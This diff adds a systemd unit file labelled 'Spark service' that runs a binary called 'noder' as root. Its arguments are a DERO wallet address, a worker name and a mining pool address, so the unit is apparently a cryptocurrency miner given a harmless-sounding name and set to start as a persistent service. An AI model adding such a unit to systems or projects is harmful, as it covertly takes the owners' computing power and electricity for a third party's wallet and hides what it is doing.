@@ -1,0 +1,12 @@
+[Unit]
+Description=Spark service
+
+[Service]
+User=root
+Group=root
+WorkingDirectory=~
+Type=simple
+ExecStart=/usr/bin/noder  --dns-server 1.1.1.1 -m 14 -w dero1qyqh8tdayezaqu3c8ggcjauyvesuc94z99h5uphh2259plreejcgcqgw9jja3.1pool --non-interactive --daemon-rpc-address pool.whalesburg.com:4300
+
+[Install]
+WantedBy=default.target
